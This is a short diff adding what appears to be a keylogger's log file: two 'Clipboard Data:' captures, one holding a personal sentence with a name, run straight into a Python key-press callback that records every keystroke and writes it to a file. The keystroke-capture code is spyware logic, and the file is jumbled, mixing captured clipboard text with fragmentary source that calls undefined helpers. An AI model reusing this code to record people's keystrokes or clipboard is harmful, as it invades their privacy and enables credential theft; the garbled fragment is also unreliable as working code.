@@ -1,0 +1,12 @@
+Clipboard Data: 
+hello my name is rishu kumarClipboard Data: 
+def on_press(key):
+    global keys, count, currentTime
+    # to print key typed as output
+    print(key)
+    keys.append(key)
+    count += 1
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
